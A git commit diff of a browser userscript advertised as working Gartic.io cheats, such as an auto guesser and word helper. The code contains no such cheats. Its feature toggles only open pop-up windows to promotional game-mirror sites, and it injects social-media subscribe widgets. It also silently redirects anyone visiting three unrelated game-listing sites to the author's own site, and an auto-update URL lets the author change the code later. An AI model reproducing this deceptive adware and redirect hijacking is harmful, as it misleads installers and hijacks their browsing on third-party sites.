b7ba0a79703a06a5c604f2853f566aebbe508347
MrCoderN <45430918+MrCoderN@users.noreply.github.com>
2019-04-08 03:41:00 +0300

    new update

--- garticiohack.user.js
+++ garticiohack.user.js
@@ -1,22 +1,148 @@
 // ==UserScript==
-// @name         Gartic.io 2019 (Hacks,Mods,Cheats) - Really Working (sandbox-unblocked)
-// @description  Garticio Auto Guess,Word Helper,Faster Drawer, Player Info, Faster Writer, Adblock
-// @author       Never-Steal-Dont-Ban
-// @namespace    Never-Steal-Dont-Ban
-// @version      1.2
-// @match *://gartic.io/*
-// @require http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js
-// @require      https://code.jquery.com/jquery-3.3.1.min.js
+// @name         Gartic.io Hacks Cheats Mods 2019 - Working - (sandbox-unblocked) by ioMods.org
+// @description  Garticio Mods Features: Guess Helper, Faster Drawer, Faster Writer, Auto Guesser, FPS, Adblock Created by ioMods.org
+// @namespace    iomods.org
+// @author       iomods.org
+// @version      1
+// @require      http://code.jquery.com/jquery-3.3.1.min.js
+// @updateURL    https://iomods.org/mods/garticio.user.js
+// @downloadURL  https://iomods.org/mods/garticio.user.js
+// @match        *://gartic.io/*
+// @match        *iogames.space/*
+// @match        *titotu.io/*
+// @match        *io-games.io/*
 // ==/UserScript==
-setTimeout(function() {
-$('.lastRooms').append('<div style="border:2px solid black;border-radius:20px;padding:5px;background-color: rgba(255, 255, 255, 0);"><div class="containerFreespace0"></div></div>');
-$('.anonymus').append('<div class="containerFreespace0"></div>');
- $('.mobileHide').html('<div style="border:2px solid black;border-radius:20px;padding:5px;background-color: rgba(255, 255, 255, 0.3);"><div class="containerFreespace11"></div></div>');
-$('.containerFreespace0').html('<a style="font-weight:bold;color:black;font-size:14px;" href="https://goo.gl/gtEqkM" target="blank">Word Helper</a> <label style="padding-left: 2px;" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'https://goo.gl/SXUzeF\', \'_blank\', \'location=yes,scrollbars=yes,status=yes,height=570,width=520\');"><span class=\'slider\'></span></label> <-> <a style="font-weight:bold;color:black;font-size:14px;" href="https://goo.gl/3ee6Lz" target="blank">Guess Trier</a> <label style="padding-left: 2px;" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'https://goo.gl/aHMmvA\', \'_blank\', \'location=yes,scrollbars=yes,status=yes,height=570,width=520\');"><span class=\'slider\'></span></label><div class="containerFreespace3"></div>');
-$('.containerFreespace3').html('<a style="font-weight:bold;color:black;font-size:14px;" href="https://goo.gl/Lb1GKp" target="blank">Inform Giver</a> <label style="padding-left: 2px;" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'https://goo.gl/Lb1GKp\', \'_blank\', \'location=yes,scrollbars=yes,status=yes,height=570,width=520\');"><span class=\'slider\'></span></label> <-> <a style="font-weight:bold;color:black;font-size:14px;" href="https://goo.gl/XCNoJL" target="blank">Faster Writer</a> <label style="padding-left: 2px;" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'https://goo.gl/XCNoJL\', \'_blank\', \'location=yes,scrollbars=yes,status=yes,height=570,width=520\');"><span class=\'slider\'></span></label><div class="containerFreespace5"></div>');
-$('.containerFreespace5').html('<a style="font-weight:bold;color:black;font-size:14px;" href="https://goo.gl/6kqrgN" target="blank">Faster Drawer</a> <label style="padding-left: 2px;" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'https://goo.gl/6kqrgN\', \'_blank\', \'location=yes,scrollbars=yes,status=yes,height=570,width=520\');"><span class=\'slider\'></span></label> <-> <a style="font-weight:bold;color:black;font-size:14px;" href="https://goo.gl/FGU9pC" target="blank">Auto Draw (?)</a> <label style="padding-left: 2px;" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'https://goo.gl/FGU9pC\', \'_blank\', \'location=yes,scrollbars=yes,status=yes,height=570,width=520\');"><span class=\'slider\'></span></label><div class="containerFreespace7"></div>');
-$('.containerFreespace7').html('<a style="font-weight:bold;color:black;font-size:14px;" href="https://goo.gl/aHMmvA" target="blank">Auto Guess (?)</a> <label style="padding-left: 2px;" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'https://goo.gl/28tVmw\', \'_blank\', \'location=yes,scrollbars=yes,status=yes,height=570,width=520\');"><span class=\'slider\'></span></label> <-> <a style="font-weight:bold;color:black;font-size:14px;" href="https://goo.gl/GyxY6U" target="blank">Show Player Info</a> <label style="padding-left: 2px;" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'https://goo.gl/X8Lhyn\', \'_blank\', \'location=yes,scrollbars=yes,status=yes,height=570,width=520\');"><span class=\'slider\'></span></label><div class="containerFreespace9"></div>');
-$('.containerFreespace9').html('<a style="font-weight:bold;color:black;font-size:14px;" href="https://goo.gl/SXUzeF" target="blank">Adblock Plus+</a> <label style="padding-left: 2px;" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'https://goo.gl/uqFAWf\', \'_blank\', \'location=yes,scrollbars=yes,status=yes,height=570,width=520\');"><span class=\'slider\'></span></label>');
-$('.containerFreespace11').html('<div style="color:white;background-color: black;padding-top:3px;padding-bottom:3px;" id="desktopInstructions" class="menuText"><a class="menuLink" href="https://goo.gl/XCNoJL" target="_blank" style="color:orange;font-size:12px;">SLITHERE.COM</a> - <a class="menuLink" href="https://goo.gl/6kqrgN" target="_blank" style="color:orange;font-size:12px;">KRUNKERIO.NET</a> - <a class="menuLink" href="https://goo.gl/FGU9pC" target="_blank" style="color:orange;font-size:12px;">KRUNKERIO.ORG</a> - <a class="menuLink" href="https://goo.gl/SXUzeF" target="_blank" style="font-size:12px;color:white;">ZOMBSROYALEIO.ORG</a> - <a class="menuLink" href="https://goo.gl/9PX3kG" target="_blank" style="font-size:12px;color:white;">DIEPIOPLAY.COM</a> - <a class="menuLink" href="https://goo.gl/Lb1GKp" target="_blank" style="color:white;font-size:12px;">SURVIVIO.INFO</a> - <a class="menuLink" href="https://goo.gl/28tVmw" target="_blank" style="font-size:12px;color:white;">SKRIBBLIO.NET</a> - <a class="menuLink" href="https://goo.gl/E6AuWS" target="_blank" style="font-size:12px;color:white;">BONK-IO.NET</a> - <a class="menuLink" href="https://goo.gl/aHMmvA" target="_blank" style="font-size:12px;color:white;">MOPE-IO.NET</a> - <a class="menuLink" href="https://goo.gl/GyxY6U" target="_blank" style="font-size:12px;color:white;">MOPEIOGAME.COM</a> - <a class="menuLink" href="https://goo.gl/X8Lhyn" target="_blank" style="font-size:12px;color:white;">MOOMOOIOPLAY.COM</a> - <a class="menuLink" href="https://goo.gl/uqFAWf" target="_blank" style="font-size:12px;color:white;">DIEPIOPLAY.ORG</a> - <a class="menuLink" href="https://goo.gl/af7rF6" target="_blank" style="font-size:12px;color:white;">IOGAMESLIST.ORG</a> - <a class="menuLink" href="https://goo.gl/JcfvKP" target="_blank" style="color:lightgreen;font-size:12px;">SHELLSHOCKIO.ORG</a></div><div class="containerFreespace0"></div>');
 
+setTimeout(function() {
+//tanitim belgeseli
+var colorize,lnk,text,ministyler
+lnk = ["SLITHERE.COM", "KRUNKERIO.ORG", "KRUNKERIO.NET", "SHELLSHOCKIO.ORG", "MOOMOOIOPLAY.COM", "SURVIVIO.INFO", "ZOMBSROYALEIO.ORG", "MOPE-IO.NET", "MOPEIOGAME.COM", "DIEPIOPLAY.COM", "DIEPIOPLAY.ORG", "SLITHERIOPLAY.ORG", "SKRIBBL-IO.NET", "SPINZ-IO.NET", "BONK-IO.NET", "TANKSMITHIO.ORG", "DEEEEP-IO.NET", "IOGAMESLIST.ORG", "IOMODS.ORG", "IO-OYUNLAR.COM"];
+text = "<b>";
+lnk.forEach(lnkfunc);
+text += "</b>";
+
+function lnkfunc(value) {
+var value2 = value;
+if(value == "SLITHERE.COM" || value == "KRUNKERIO.ORG" || value == "KRUNKERIO.NET") { colorize = true; } else { colorize = false; }
+if(value == "MOPE-IO.NET") { value2="MOPEIO.NET"; } if(value == "BONK-IO.NET") { value2="BONKIO.NET"; } if(value == "SPINZ-IO.NET") { value2="SPINZIO.NET"; } if(value == "DEEEEP-IO.NET") { value2="DEEEEPIO.NET"; } if(value == "SKRIBBL-IO.NET") { value2="SKRIBBLIO.NET"; } if(value == "IO-OYUNLAR.COM") { value2="IOOYUNLAR.COM"; }
+if(colorize == false){ministyler = "color:white;font-size:12px;padding:3px;";} else {ministyler = "color:yellow;font-size:12px;padding:3px;";}
+text += '<a href="http://'+value+'" target="_blank" style="'+ministyler+'">'+value2+'</a> - ';
+}
+
+//genel isimlendirme ve ayarlar
+ this.settings = {
+            feature1: "Show FPS",
+            feature2: "Word Helper",
+            feature3: "Draw Helper",
+            feature4: "Faster Drawer",
+            feature5: "Faster Writer",
+            feature6: "Inform Giver",
+            feature7: "Show Players",
+            feature8: "Better Draw Tools",
+            feature9: "Extra Features+",
+            feature10: "Adblock Plus+",
+            feature11: "Zoom In/Out",
+            feature12: "Rainbow BG",
+            feature13: "Change BG",
+     l1: "slithere.com",
+     l2: "krunkerio.net",
+     l3: "krunkerio.org",
+     l4: "zombsroyaleio.org",
+     l5: "survivio.info",
+     l6: "skribbl-io.net",
+     l7: "mope-io.net",
+     l8: "moomooioplay.com",
+     l9: "shellshockio.org",
+     l10: "iogameslist.org",
+     l11: "shellshockio.org",
+     l12: "diepioplay.com",
+     l13: "diepioplay.org",
+     string: "<a style=\"padding-right: 12px;\"></a> <font color=\"black\">—</font> <a style=\"padding-left: 12px;\"></a>",
+     buttonpadder: "padding-left: 2px;",
+     locationer: "location=yes,scrollbars=yes,status=yes,height=570,width=520",
+     locationer2: "location=yes,scrollbars=yes,status=yes,left=800,height=570,width=520",
+	 optionstyler: "font-weight:bold;color:black;font-size:14px;",
+     optionstyler2: "font-weight:bold;color:black;font-size:14px;",
+     optionstyler3: "color:black;font-size:11px;",
+     facebooker: '<div id="fb-root" style="display: inline-block;"></div><script async defer crossorigin="anonymous" src="https://connect.facebook.net/en_EN/sdk.js#xfbml=1&version=v3.2"></script><div class="fb-like" style="display: inline-block;" data-href="https://facebook.com/slitherecom" data-layout="button_count" data-action="like" data-size="small" data-show-faces="false" data-share="false"></div>',
+     youtuber: "<script src=\"https://apis.google.com/js/platform.js\"></script><div class=\"g-ytsubscribe\" data-channelid=\"UCy6xGaMhm74YeHMDGgEr7kg\" data-layout=\"default\" style=\"display: inline-block;\" data-count=\"default\"></div>",
+     formstyle: "border:2px solid black;border-radius:20px;padding:5px;background-color: rgba(245, 245, 245, 1.0);",
+     fpsstyle: "border:1px solid black;border-radius:20px;padding:3px;width:80px;height:20px;font-size: 15px;text-align:center;background-color: rgba(0, 0, 0, 0.8);color:white;",
+     tablostyle: "border:2px solid black;border-radius:20px;padding:5px;background-color: rgba(255, 255, 255, 0.3);",
+     liststyler: "color:white;background-color: black;padding:3px;border-style:double;-webkit-box-shadow: 1px 1px 2px 1px rgba(0,0,0,0.39);-moz-box-shadow: 1px 1px 2px 1px rgba(0,0,0,0.39);box-shadow: 1px 1px 2px 1px rgba(0,0,0,0.39);",
+ };
+
+//degisenkisimlar
+$('.logo').append('<div style="'+this.settings.fpsstyle+'" id="fps" class="fps"></div>');
+$('.form').append('<div style="'+this.settings.formstyle+'"><div class="option1"></div>'+this.settings.youtuber+''+this.settings.facebooker+'</div>');
+$('.mobileHide').html('<div class="list1"></div>');
+//general
+$('.option1').html('<a style="'+this.settings.optionstyler+'" href="http://'+this.settings.l1+'" target="blank">'+this.settings.feature1+'</a> <label style="'+this.settings.buttonpadder+'" class=\'switch\'><input type=\'checkbox\' class="fps" onchange="window.open(\'http://'+this.settings.l1+'\', \'_blank\', \''+this.settings.locationer+'\');" checked></label>'+this.settings.string+'<a style="'+this.settings.optionstyler2+'" href="http://'+this.settings.l2+'" target="blank">'+this.settings.feature2+'</a> <label style="'+this.settings.buttonpadder+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'http://'+this.settings.l2+'\', \'_blank\', \''+this.settings.locationer+'\');"><span class=\'slider\'></span></label><div class="option2"></div>');
+$('.option1').on('click', '.fps', function() { hideandseek(); });
+$('.option2').html('<a style="'+this.settings.optionstyler+'" href="http://'+this.settings.l3+'" target="blank">'+this.settings.feature3+'</a> <label style="'+this.settings.buttonpadder+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'http://'+this.settings.l3+'\', \'_blank\', \''+this.settings.locationer+'\');"></label>'+this.settings.string+'<a style="'+this.settings.optionstyler2+'" href="http://'+this.settings.l4+'" target="blank">'+this.settings.feature4+'</a> <label style="'+this.settings.buttonpadder+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'http://'+this.settings.l4+'\', \'_blank\', \''+this.settings.locationer+'\');"></label><div class="option3"></div>');
+$('.option3').html('<a style="'+this.settings.optionstyler+'" href="http://'+this.settings.l5+'" target="blank">'+this.settings.feature5+'</a> <label style="'+this.settings.buttonpadder+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'http://'+this.settings.l5+'\', \'_blank\', \''+this.settings.locationer+'\');"></label>'+this.settings.string+'<a style="'+this.settings.optionstyler2+'" href="http://'+this.settings.l6+'" target="blank">'+this.settings.feature6+'</a> <label style="'+this.settings.buttonpadder+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'http://'+this.settings.l6+'\', \'_blank\', \''+this.settings.locationer+'\');"></label><div class="option4"></div>');
+$('.option4').html('<a style="'+this.settings.optionstyler+'" href="http://'+this.settings.l7+'" target="blank">'+this.settings.feature7+'</a> <label style="'+this.settings.buttonpadder+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'http://'+this.settings.l7+'\', \'_blank\', \''+this.settings.locationer+'\');"></label>'+this.settings.string+'<a style="'+this.settings.optionstyler2+'" href="http://'+this.settings.l8+'" target="blank">'+this.settings.feature8+'</a> <label style="'+this.settings.buttonpadder+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'http://'+this.settings.l8+'\', \'_blank\', \''+this.settings.locationer+'\');"></label><div class="option5"></div>');
+$('.option5').html('<a style="'+this.settings.optionstyler+'" href="http://'+this.settings.l9+'" target="blank">'+this.settings.feature9+'</a> <label style="'+this.settings.buttonpadder+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'http://'+this.settings.l9+'\', \'_blank\', \''+this.settings.locationer+'\');"></label>'+this.settings.string+'<a style="'+this.settings.optionstyler2+'" href="http://'+this.settings.l10+'" target="blank">'+this.settings.feature10+'</a> <label style="'+this.settings.buttonpadder+'" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'http://'+this.settings.l10+'\', \'_blank\', \''+this.settings.locationer+'\');"></label><div class="option6"></div>');
+$('.option6').html('<a style="'+this.settings.optionstyler+'" href="http://'+this.settings.l12+'" target="blank">'+this.settings.feature12+'</a> <label style="'+this.settings.buttonpadder+'" class=\'switch\'><input type=\'checkbox\' class="renkcont" onchange="window.open(\'http://'+this.settings.l12+'\', \'_blank\', \''+this.settings.locationer+'\');"></label>'+this.settings.string+'<a style="'+this.settings.optionstyler2+'" href="http://'+this.settings.l13+'" target="blank">'+this.settings.feature13+'</a> <label style="'+this.settings.buttonpadder+'" class=\'switch\'><input type=\'color\' class="bgcont" style="width: 1em;height:17px;" onchange="window.open(\'http://'+this.settings.l13+'\', \'_blank\', \''+this.settings.locationer+'\');"></label><div class="option7"></div>');
+$('.option6').on('change', '.renkcont', function() { colorfulmod(); });
+$('.option6').on('change', '.bgcont', function() { changebackground(); });
+$('.option7').html('<a style="'+this.settings.optionstyler+'" href="http://'+this.settings.l11+'" target="blank">'+this.settings.feature11+'</a> <input name="zoom" id="zoom" type="number" style="width: 4em" min="70" max="140" step="1" value="100" class="zoom" oninput="amount.value=zoom.value;" onchange="window.open(\'http://'+this.settings.l11+'\', \'_blank\', \''+this.settings.locationer2+'\');"> <output style="'+this.settings.optionstyler2+'" id="amount" name="amount" for="zoom">"100"</output> <a style="'+this.settings.optionstyler3+'" href="http://'+this.settings.l11+'" target="blank">(Min: 70-Max: 140)</a>');
+$('.option7').on('input', '.zoom', function(e) { zoominout(); });
+$('.list1').html('<div style="'+this.settings.liststyler+'">'+text+'</div>');
     }, 0);
+
+//fps counter
+var before,now,fps
+before=Date.now();
+fps=0;
+requestAnimationFrame(
+    function loop(){
+        now=Date.now();
+        fps=Math.round(1000/(now-before));
+        before=now;
+    requestAnimationFrame(loop);
+        document.getElementById('fps').innerHTML = 'FPS: ' + fps;
+    }
+);
+
+if(window.location.href.indexOf("io-games.io") > -1 || window.location.href.indexOf("iogames.space") > -1 || window.location.href.indexOf("titotu.io") > -1) { location.replace("http://iogameslist.org"); }
+function hideandseek() {
+  var x = document.getElementById("fps");
+  if (x.style.display === "none") {
+    x.style.display = "block";
+  } else {
+    x.style.display = "none";
+  }
+}
+
+//background kismi degisir
+function changebackground() {
+    var changecolor =  $('.bgcont').val();
+$('#background').css('background-color',''+changecolor+'');
+}
+
+var colorsrain;
+var checkedrain=false;
+function colorfulmod() {
+    if(checkedrain==false) {
+        checkedrain=true;
+      colorsrain = ["#ff0000","#00ff00","#0000ff","#000000","#ffffff","#ff00ff","#00ffff","#981890","#ff7f00","#0085ff","#00bf00"];
+    } else {
+        checkedrain=false;
+    colorsrain = ["#0085ff"];
+    }
+      setInterval(function() {
+                 var bodybgarrayno = Math.floor(Math.random() * colorsrain.length);
+                 var selectedcolor = colorsrain[bodybgarrayno];
+                $("#background").css("background-color",selectedcolor);
+      }, 3000);
+}
+
+//burda birsey degismesi gerekmez
+function zoominout() {
+    var findinput = $('.zoom').val();
+    if(findinput >= 70 && findinput <= 140)
+    {
+    $('body').css('zoom',''+findinput+'%');
+    } else { $('body').css('zoom','100%'); }
+}
